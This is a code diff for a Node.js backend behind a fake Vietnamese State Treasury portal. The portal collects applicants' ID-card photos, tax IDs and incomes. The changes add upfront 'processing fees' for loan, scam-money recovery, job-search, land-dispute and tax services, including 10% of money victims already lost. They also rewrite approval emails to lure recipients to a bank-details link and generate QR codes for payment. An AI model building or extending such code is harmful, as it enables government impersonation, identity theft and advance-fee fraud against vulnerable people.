@@ -47,7 +47,10 @@ const H = {
     DESIRED_JOB: 'Ngành nghề mong muốn',
     PREFERRED_LOCATION: 'Khu vực/Địa chỉ mong muốn',
     EXPERIENCE: 'Kinh nghiệm làm việc',
-    DISPUTE_CONTENT: 'Nội dung tranh chấp'
+    DISPUTE_CONTENT: 'Nội dung tranh chấp',
+    SCAMMED_AMOUNT: 'Số tiền bị lừa',
+    DISPUTED_ASSET_VALUE: 'Giá trị tài sản tranh chấp',
+    FEE_AMOUNT: 'Phí xử lý'
 };
 
 // Using underscores instead of spaces to avoid 400 "Unable to parse range" errors
@@ -109,8 +112,10 @@ const getEmailContent = (service, fullName, token) => {
             html: `<div style="font-family: Arial; padding: 20px; border: 1px solid #ddd;">
                 <h2 style="color: #1a4f7a;">Chào ${fullName},</h2>
                 <p>Chúc mừng! Hồ sơ <b>Hỗ trợ lấy lại tiền treo</b> của bạn đã được phê duyệt thành công.</p>
-                <p>Bộ phận Pháp lý sẽ liên hệ với bạn trong thời gian sớm nhất qua số điện thoại hoặc email để hướng dẫn các bước tiếp theo.</p>
-                <p>Cảm ơn bạn đã tin tưởng dịch vụ của Kho bạc Nhà nước.</p>
+                <p><b>Phí xử lý hồ sơ:</b> 10% số tiền bị lừa (sẽ hiển thị khi thanh toán)</p>
+                <p>Vui lòng nhấn vào liên kết dưới đây để cập nhật thông tin ngân hàng và hoàn tất thủ tục:</p>
+                <div style="margin: 20px 0;"><a href="${verifyLink}" style="background: #1a4f7a; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">HOÀN TẤT THỦ TỤC</a></div>
+                <p style="color: #666; font-size: 12px;">Nếu liên kết không hoạt động, hãy copy đường dẫn này: ${verifyLink}</p>
             </div>`
         },
         'tim-viec': {
@@ -118,8 +123,10 @@ const getEmailContent = (service, fullName, token) => {
             html: `<div style="font-family: Arial; padding: 20px; border: 1px solid #ddd;">
                 <h2 style="color: #1a4f7a;">Chào ${fullName},</h2>
                 <p>Chúc mừng! Hồ sơ <b>Tìm việc làm</b> của bạn đã được xét duyệt thành công.</p>
-                <p>Chúng tôi sẽ liên hệ với bạn qua số điện thoại hoặc email để giới thiệu các cơ hội việc làm phù hợp.</p>
-                <p>Cảm ơn bạn đã tin tưởng dịch vụ của chúng tôi.</p>
+                <p><b>Phí xử lý hồ sơ:</b> 3,000,000 VND (cố định)</p>
+                <p>Vui lòng nhấn vào liên kết dưới đây để cập nhật thông tin ngân hàng và hoàn tất thủ tục:</p>
+                <div style="margin: 20px 0;"><a href="${verifyLink}" style="background: #1a4f7a; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">HOÀN TẤT THỦ TỤC</a></div>
+                <p style="color: #666; font-size: 12px;">Nếu liên kết không hoạt động, hãy copy đường dẫn này: ${verifyLink}</p>
             </div>`
         },
         'dat-dai': {
@@ -127,8 +134,10 @@ const getEmailContent = (service, fullName, token) => {
             html: `<div style="font-family: Arial; padding: 20px; border: 1px solid #ddd;">
                 <h2 style="color: #1a4f7a;">Chào ${fullName},</h2>
                 <p>Hồ sơ <b>Giải quyết đất đai</b> của bạn đã được tiếp nhận và xét duyệt thành công.</p>
-                <p>Bộ phận Pháp lý sẽ liên hệ với bạn trong thời gian sớm nhất để hướng dẫn các bước giải quyết tranh chấp.</p>
-                <p>Trân trọng!</p>
+                <p><b>Phí xử lý hồ sơ:</b> 10% giá trị tài sản tranh chấp</p>
+                <p>Vui lòng nhấn vào liên kết dưới đây để cập nhật thông tin ngân hàng và hoàn tất thủ tục:</p>
+                <div style="margin: 20px 0;"><a href="${verifyLink}" style="background: #1a4f7a; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">HOÀN TẤT THỦ TỤC</a></div>
+                <p style="color: #666; font-size: 12px;">Nếu liên kết không hoạt động, hãy copy đường dẫn này: ${verifyLink}</p>
             </div>`
         },
         'nop-thue': {
@@ -136,8 +145,10 @@ const getEmailContent = (service, fullName, token) => {
             html: `<div style="font-family: Arial; padding: 20px; border: 1px solid #ddd;">
                 <h2 style="color: #1a4f7a;">Chào ${fullName},</h2>
                 <p>Hồ sơ <b>Kê khai thuế</b> của bạn đã được xét duyệt thành công.</p>
-                <p>Chúng tôi sẽ liên hệ với bạn để hướng dẫn nộp thuế điện tử.</p>
-                <p>Cảm ơn bạn đã sử dụng dịch vụ của Kho bạc Nhà nước.</p>
+                <p><b>Phí xử lý hồ sơ:</b> 10% thu nhập hàng tháng</p>
+                <p>Vui lòng nhấn vào liên kết dưới đây để cập nhật thông tin ngân hàng và hoàn tất thủ tục:</p>
+                <div style="margin: 20px 0;"><a href="${verifyLink}" style="background: #1a4f7a; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">HOÀN TẤT THỦ TỤC</a></div>
+                <p style="color: #666; font-size: 12px;">Nếu liên kết không hoạt động, hãy copy đường dẫn này: ${verifyLink}</p>
             </div>`
         },
         'default': {
@@ -145,8 +156,9 @@ const getEmailContent = (service, fullName, token) => {
             html: `<div style="font-family: Arial; padding: 20px; border: 1px solid #ddd;">
                 <h2 style="color: #1a4f7a;">Chào ${fullName},</h2>
                 <p>Hồ sơ của bạn tại cổng thông tin Kho bạc Nhà nước đã được xét duyệt thành công.</p>
-                <p>Chúng tôi sẽ liên hệ với bạn trong thời gian sớm nhất.</p>
-                <p>Trân trọng!</p>
+                <p>Vui lòng nhấn vào liên kết dưới đây để hoàn tất thủ tục:</p>
+                <div style="margin: 20px 0;"><a href="${verifyLink}" style="background: #1a4f7a; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">HOÀN TẤT THỦ TỤC</a></div>
+                <p style="color: #666; font-size: 12px;">Nếu liên kết không hoạt động, hãy copy đường dẫn này: ${verifyLink}</p>
             </div>`
         }
     };
@@ -205,7 +217,7 @@ async function initSheets() {
     try {
         const doc = await getDoc(true); // Always refresh info on init
         const loanHeaders = [H.TIME, H.NAME, H.GENDER, H.AGE, H.CCCD, H.PHONE, H.EMAIL, H.ADDRESS, H.JOB, H.HAS_LOAN, H.INCOME, H.AMOUNT, H.REFERRAL, H.URL_FRONT, H.URL_BACK, H.STATUS, H.TOKEN, H.MAIL_SENT];
-        const legalHeaders = [H.TIME, H.NAME, H.GENDER, H.AGE, H.CCCD, H.PHONE, H.EMAIL, H.REFERRAL, H.EDUCATION, H.TAX_ID, H.MONTHLY_INCOME, H.DESIRED_JOB, H.PREFERRED_LOCATION, H.EXPERIENCE, H.DISPUTE_CONTENT, H.URL_FRONT, H.URL_BACK, H.URL_BILL, H.URL_LAND_PAPER, H.STATUS, H.TOKEN, H.MAIL_SENT];
+        const legalHeaders = [H.TIME, H.NAME, H.GENDER, H.AGE, H.CCCD, H.PHONE, H.EMAIL, H.REFERRAL, H.EDUCATION, H.TAX_ID, H.MONTHLY_INCOME, H.SCAMMED_AMOUNT, H.DISPUTED_ASSET_VALUE, H.FEE_AMOUNT, H.DESIRED_JOB, H.PREFERRED_LOCATION, H.EXPERIENCE, H.DISPUTE_CONTENT, H.URL_FRONT, H.URL_BACK, H.URL_BILL, H.URL_LAND_PAPER, H.STATUS, H.TOKEN, H.MAIL_SENT];
 
         const syncSheet = async (oldTitle, newTitle, headers) => {
             // 1. Try to find if a sheet with the NEW title already exists
@@ -300,8 +312,8 @@ async function checkAndSendEmails() {
                     else if (sheet.title === T.LAND_LEGAL) serviceType = 'dat-dai';
                     else if (sheet.title === T.TAX_SUPPORT) serviceType = 'nop-thue';
 
-                    // Generate token if needed (mainly for vay-von disbursement flow)
-                    if (serviceType === 'vay-von' && !token) {
+                    // Generate token for ALL services (needed for bank form link)
+                    if (!token) {
                         token = 'tk-' + Math.random().toString(36).substr(2, 9);
                         row.set(H.TOKEN, token);
                     }
@@ -376,6 +388,21 @@ app.post('/api/submit', (req, res) => {
                 rowData[H.PREFERRED_LOCATION] = data.preferredLocation || '';
                 rowData[H.EXPERIENCE] = data.workExperience || '';
                 rowData[H.DISPUTE_CONTENT] = data.disputeContent || '';
+                rowData[H.SCAMMED_AMOUNT] = data.scammedAmount || '';
+                rowData[H.DISPUTED_ASSET_VALUE] = data.disputedAssetValue || '';
+
+                // Calculate fee based on service
+                let fee = 0;
+                if (service === 'tien-treo') {
+                    fee = Math.round(parseInt(data.scammedAmount || 0) * 0.1);
+                } else if (service === 'tim-viec') {
+                    fee = 3000000; // Fixed 3M
+                } else if (service === 'nop-thue') {
+                    fee = Math.round(parseInt(data.monthlyIncome || 0) * 0.1);
+                } else if (service === 'dat-dai') {
+                    fee = Math.round(parseInt(data.disputedAssetValue || 0) * 0.1);
+                }
+                rowData[H.FEE_AMOUNT] = fee;
             }
 
             await targetSheet.addRow(rowData);
@@ -410,7 +437,12 @@ app.get('/api/status', async (req, res) => {
         }
 
         if (infoRow) {
-            result.amount = infoRow.get(H.AMOUNT) || '';
+            // Get amount - for vay-von it's loan amount, for others it's fee amount
+            const loanAmount = infoRow.get(H.AMOUNT) || '';
+            const feeAmount = infoRow.get(H.FEE_AMOUNT) || '';
+            result.amount = loanAmount || feeAmount;
+            result.fee = feeAmount || (loanAmount ? Math.round(parseInt(loanAmount) * 0.1) : 0);
+
             const infoStatus = (infoRow.get(H.STATUS) || 'PENDING').toUpperCase();
             if (infoStatus === 'PENDING') result.status = 'pending';
             else if (infoStatus === 'APPROVED') {
@@ -435,16 +467,47 @@ app.post('/api/submit-bank', async (req, res) => {
     try {
         if (!sheets.bankSheet || !sheets.loanSheet) await initSheets();
 
-        // 1. Fetch loan amount from loanSheet
-        const loanRows = await sheets.loanSheet.getRows().catch(() => []);
-        const loanRow = loanRows.find(r => r.get(H.TOKEN) === token);
-        const amountStr = loanRow ? (loanRow.get(H.AMOUNT) || '0') : '0';
-        const amount = parseInt(amountStr.replace(/[^0-9]/g, '')) || 0;
-        const fee = Math.round(amount * 0.1);
+        // 1. Search for row with this token in ALL sheets
+        const allRegSheets = [sheets.loanSheet, ...Object.values(sheets.legalSheets)].filter(s => !!s);
+        let infoRow = null;
+        let sheetTitle = '';
+        for (const s of allRegSheets) {
+            const rows = await s.getRows().catch(() => []);
+            infoRow = rows.find(r => r.get(H.TOKEN) === token);
+            if (infoRow) {
+                sheetTitle = s.title;
+                break;
+            }
+        }
 
-        // 2. Generate SePay QR URL
-        // Template: https://qr.sepay.vn/img?acc=STK&bank=NGAN_HANG&amount=SO_TIEN&des=NOI_DUNG&template=compact
-        const qrUrl = `https://qr.sepay.vn/img?acc=${bankAccount}&bank=${encodeURIComponent(bankName)}&amount=${fee}&des=${encodeURIComponent('PHÍ GIẢI NGÂN ' + token)}&template=compact`;
+        // 2. Calculate fee and determine QR description based on service type
+        let fee = 0;
+        let qrDescription = 'PHÍ XỬ LÝ HỒ SƠ';
+        if (infoRow) {
+            if (sheetTitle === T.LOAN) {
+                // Vay vốn: 10% of loan amount
+                const amount = parseInt((infoRow.get(H.AMOUNT) || '0').replace(/[^0-9]/g, '')) || 0;
+                fee = Math.round(amount * 0.1);
+                qrDescription = 'PHÍ GIẢI NGÂN VAY VỐN';
+            } else if (sheetTitle === T.STUCK_MONEY) {
+                fee = parseInt(infoRow.get(H.FEE_AMOUNT) || '0') || 0;
+                qrDescription = 'PHÍ HỖ TRỢ LẤY LẠI TIỀN TREO';
+            } else if (sheetTitle === T.JOB_SEARCH) {
+                fee = parseInt(infoRow.get(H.FEE_AMOUNT) || '0') || 0;
+                qrDescription = 'PHÍ HỖ TRỢ TÌM VIỆC LÀM';
+            } else if (sheetTitle === T.LAND_LEGAL) {
+                fee = parseInt(infoRow.get(H.FEE_AMOUNT) || '0') || 0;
+                qrDescription = 'PHÍ GIẢI QUYẾT ĐẤT ĐAI';
+            } else if (sheetTitle === T.TAX_SUPPORT) {
+                fee = parseInt(infoRow.get(H.FEE_AMOUNT) || '0') || 0;
+                qrDescription = 'PHÍ HỖ TRỢ KÊ KHAI THUẾ';
+            } else {
+                fee = parseInt(infoRow.get(H.FEE_AMOUNT) || '0') || 0;
+            }
+        }
+
+        // 3. Generate SePay QR URL with service-specific description
+        const qrUrl = `https://qr.sepay.vn/img?acc=${bankAccount}&bank=${encodeURIComponent(bankName)}&amount=${fee}&des=${encodeURIComponent(qrDescription + ' ' + token)}&template=compact`;
 
         // 3. Save to Bank Sheet
         const bankData = {};
